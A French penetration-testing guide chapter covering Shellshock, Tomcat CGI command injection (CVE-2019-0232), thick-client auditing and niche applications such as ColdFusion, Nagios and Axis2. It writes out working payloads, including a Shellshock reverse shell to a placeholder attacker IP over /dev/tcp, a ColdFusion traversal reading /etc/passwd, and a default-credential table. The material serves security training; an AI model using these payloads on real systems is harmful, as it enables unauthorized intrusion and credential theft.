# CGI, clients lourds et applications diverses

Ce chapitre regroupe les vecteurs d'attaque sur les applications CGI (Shellshock, Tomcat CGI), les clients lourds (.exe, .jar) et un panorama d'applications moins courantes mais regulierement rencontrees en pentest (ColdFusion, WebLogic, Axis2, Nagios, etc.).

## Pourquoi

Les applications CGI sont un heritage des annees 90 encore present sur de nombreux serveurs. Shellshock (CVE-2014-6271) reste exploitable en 2024 sur des systemes non patches. Les clients lourds sont souvent negliges dans les audits de securite alors qu'ils contiennent frequemment des identifiants en dur ou des connexions non chiffrees. Enfin, les applications "de niche" (monitoring, gestion de configuration, wikis internes) constituent des points d'entree opportunistes quand les cibles principales sont durcies.

## Comment ca marche

### Shellshock (CVE-2014-6271)

Shellshock est une vulnerabilite dans Bash qui permet d'injecter des commandes via les variables d'environnement. Les applications CGI sont particulierement affectees car le serveur web transmet les headers HTTP (User-Agent, Referer, Cookie) comme variables d'environnement au script CGI.

#### Enumeration

```bash
# - Chercher les scripts CGI
gobuster dir -u http://<IP_CIBLE>/cgi-bin/ \
    -w /usr/share/wordlists/dirb/small.txt -x .cgi,.sh,.pl,.py
```

#### Confirmation

```bash
# - Tester Shellshock via le User-Agent
curl -H 'User-Agent: () { :; }; echo; echo "VULNERABLE"' \
    http://<IP_CIBLE>/cgi-bin/status.cgi
```

Si la reponse contient "VULNERABLE", le serveur est exploitable.

#### Exploitation

```bash
# - Reverse shell via Shellshock
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP_ATTAQUANT>/4443 0>&1' \
    http://<IP_CIBLE>/cgi-bin/status.cgi
```

{% hint style="info" %}
Shellshock fonctionne sur tout header HTTP transmis comme variable d'environnement. Si le User-Agent est filtre, tester avec le Referer ou un header custom accepte par le serveur.
{% endhint %}

### Tomcat CGI (CVE-2019-0232)

Cette vulnerabilite affecte le CGI Servlet de Tomcat sur Windows quand `enableCmdLineArguments` est active. Elle permet d'injecter des commandes via les parametres de requete.

**Versions affectees** : Tomcat 9.0.0.M1 a 9.0.17, 8.5.0 a 8.5.39, 7.0.0 a 7.0.93

#### Enumeration

```bash
# - Chercher les fichiers .bat et .cmd
gobuster dir -u http://<IP_CIBLE>:8080/cgi/ \
    -w /usr/share/wordlists/dirb/small.txt -x .bat,.cmd
```

#### Exploitation

```bash
# - Injection de commande via le separateur &
# - Les commandes doivent utiliser le chemin complet (PATH non defini)
curl "http://<IP_CIBLE>:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe"
```

{% hint style="warning" %}
La variable PATH n'est pas definie dans l'environnement CGI de Tomcat. Toutes les commandes doivent utiliser leur chemin absolu (`c:\windows\system32\whoami.exe` au lieu de `whoami`). Les caracteres speciaux doivent etre URL-encodes.
{% endhint %}

### Clients lourds

Les clients lourds (applications desktop qui se connectent a un serveur) presentent des vulnerabilites specifiques :

#### Architecture

- **Architecture a deux niveaux** : le client communique directement avec la base de donnees. Toute la logique est cote client, facile a analyser
- **Architecture a trois niveaux** : le client communique avec un serveur d'application qui gere la base de donnees. Plus securisee, mais le client peut contenir des informations sensibles

#### Methodologie d'audit

{% tabs %}
{% tab title="Analyse statique" %}
```bash
# - Decompiler un JAR Java
# JD-GUI pour l'interface graphique, ou :
jar -xf application.jar

# - Decompiler un .exe .NET
# dnSpy ou ILSpy pour la decompilation
# de4dot pour la deobfuscation
de4dot application.exe
```

L'analyse du code decompile revele souvent :
- Des identifiants en dur (base de donnees, API)
- Des cles de chiffrement statiques
- Des endpoints d'API non documentes
{% endtab %}
{% tab title="Analyse dynamique" %}
```bash
# - Surveiller les connexions reseau
# Wireshark pour capturer le trafic
# ProcMon64 pour voir les fichiers et registres accedes

# - Debug avec x64dbg (Windows .exe)
# Placer des breakpoints sur les fonctions d'authentification
# Examiner la memoire pour les identifiants en clair
```
{% endtab %}
{% endtabs %}

#### Vulnerabilites courantes

- **Identifiants en dur** : connexion BDD directement dans le code source
- **DLL Hijacking** : le client charge des DLL depuis des repertoires non securises
- **Injection SQL** : le client construit les requetes SQL sans parametrage
- **Buffer overflow** : les champs de saisie ne sont pas valides en taille
- **Trafic non chiffre** : les identifiants transitent en clair entre le client et le serveur

### Applications diverses

#### ColdFusion

Adobe ColdFusion est un serveur d'applications web. Les versions anciennes sont vulnerables a plusieurs CVE critiques :

```bash
# - Rechercher les exploits connus
searchsploit coldfusion

# - CVE-2010-2861 : directory traversal
curl "http://<IP_CIBLE>/CFIDE/administrator/enter.cfm?locale=../../../etc/passwd%00en"
```

Les fichiers cibles pour la traversee de repertoire incluent `mappings.cfm`, `enter.cfm` et `logging/settings.cfm`.

#### Autres applications notables

| Application | Vecteur d'attaque | Identifiants par defaut |
|---|---|---|
| Axis2 | Upload de webshell AAR | `admin:axis2` |
| WebSphere | Deploy de WAR | `system:manager` |
| Nagios | RCE via interface web | `nagiosadmin:PASSW0RD` |
| Zabbix | RCE via API | `Admin:zabbix` |
| WebLogic | Deserialization Java | - |
| vCenter | CVE-2021-22005 (upload) | - |
| DotNetNuke | Auth bypass, dir traversal | - |
| Elasticsearch | API REST sans auth | Pas d'auth par defaut |

{% hint style="success" %}
Face a une application inconnue, le reflexe est : `searchsploit <nom>`, tester les identifiants par defaut (une recherche rapide en ligne suffit), et verifier la version pour les CVE connues. La plupart des applications d'entreprise ont au moins une CVE critique dans leur historique.
{% endhint %}

## En pratique

```bash
# Shellshock
# 1 - Enumerer les scripts CGI
gobuster dir -u http://<IP_CIBLE>/cgi-bin/ -w wordlist.txt -x .cgi,.sh

# 2 - Tester Shellshock
curl -H 'User-Agent: () { :; }; echo; echo VULNERABLE' http://<IP_CIBLE>/cgi-bin/script.cgi

# 3 - Reverse shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/4443 0>&1' http://<IP_CIBLE>/cgi-bin/script.cgi

# Client lourd
# 1 - Capturer le trafic reseau (Wireshark)
# 2 - Decompiler le binaire (JD-GUI, dnSpy)
# 3 - Chercher les identifiants dans le code
# 4 - Tester les injections SQL via l'interface

# Application inconnue
# 1 - searchsploit <nom_application>
# 2 - Tester les identifiants par defaut
# 3 - Verifier la version et chercher les CVE
```

## Pieges et galeres

{% tabs %}
{% tab title="CGI" %}
- **Pas de /cgi-bin/** : le repertoire CGI peut etre renomme ou masque. Tester aussi `/cgi/`, `/scripts/`, `/bin/`
- **Bash patche** : les systemes a jour ne sont pas vulnerables a Shellshock. Mais les appliances (imprimantes, routeurs, NAS) utilisent souvent des versions de Bash non mises a jour
- **Tomcat CGI desactive** : le CGI Servlet est desactive par defaut. Son activation avec `enableCmdLineArguments` est specifique et relativement rare
{% endtab %}
{% tab title="Clients lourds" %}
- **Obfuscation** : le code .NET peut etre obfusque avec des outils comme ConfuserEx. `de4dot` deobfusque la plupart des protections courantes
- **Certificat SSL pinning** : certains clients verifient le certificat du serveur, empechant l'interception avec Burp Suite
- **Anti-debug** : des techniques anti-debugging (detection de breakpoints, timing checks) peuvent bloquer l'analyse dynamique
{% endtab %}
{% endtabs %}

## Retour terrain

Shellshock est un classique qui refuse de mourir. On le trouve encore en 2024 sur des appliances, des serveurs internes oublies, et des systemes embarques. La detection est simple (un seul curl suffit) et l'exploitation est immediate.

Les clients lourds sont une mine d'informations. Meme quand l'exploitation directe n'est pas possible, la decompilation revele souvent des identifiants de base de donnees, des endpoints API non documentes, ou des cles de chiffrement qui permettent de pivoter vers d'autres systemes.

Les applications "de niche" (Nagios, Zabbix, Elasticsearch) sont souvent les maillons faibles d'un reseau d'entreprise. Deployees par l'equipe infrastructure avec les identifiants par defaut, elles echappent frequemment aux audits de securite reguliers.

## Memo express

| Technique | Cible | Outil / Commande | Prerequis |
|---|---|---|---|
| Shellshock | CGI / Bash | `curl -H 'User-Agent: () { :; };...'` | Script CGI accessible |
| CGI injection | Tomcat Windows | URL param + `&` separator | CGI Servlet active |
| Decompilation | Client .NET | dnSpy, de4dot | Binaire recupere |
| Decompilation | Client Java | JD-GUI, jar -xf | JAR recupere |
| Dir traversal | ColdFusion | CVE-2010-2861 | Version vulnerable |
| Default creds | Divers | Recherche en ligne | Application identifiee |

***
